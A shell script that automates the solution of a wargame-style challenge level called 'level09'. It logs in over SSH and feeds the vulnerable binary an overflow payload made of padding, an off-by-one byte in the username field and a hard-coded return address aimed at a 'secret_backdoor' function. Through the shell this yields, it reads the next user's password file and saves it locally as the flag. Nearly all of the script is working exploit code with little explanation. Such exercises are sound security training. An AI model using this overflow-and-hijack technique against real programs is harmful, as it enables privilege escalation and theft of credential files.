#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)";

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

main() {
    # /!\ $host $port $username and $sshid_password are defined in the source '.sshid.sh' file.
    flag=""

    # Payload(s)

    octal_addr_secret_backdoor='\214\110\125\125\125\125\000\000'

    username_payload="$(printf '%-40s' '[...PADDING...]')\377";
    msg_payload="$(printf '%-200s' '[...PADDING...]')$octal_addr_secret_backdoor";

    # Resolution

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket."; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
    {
        printf '%s\n' "cat /home/users/end/.pass > /tmp/flag.txt";
    } | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b\n' '$username_payload'; printf '%b\n' '$msg_payload'; cat -) | ~/level09 2>/dev/null";
    flag="$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt")";
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    printf '%s' "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
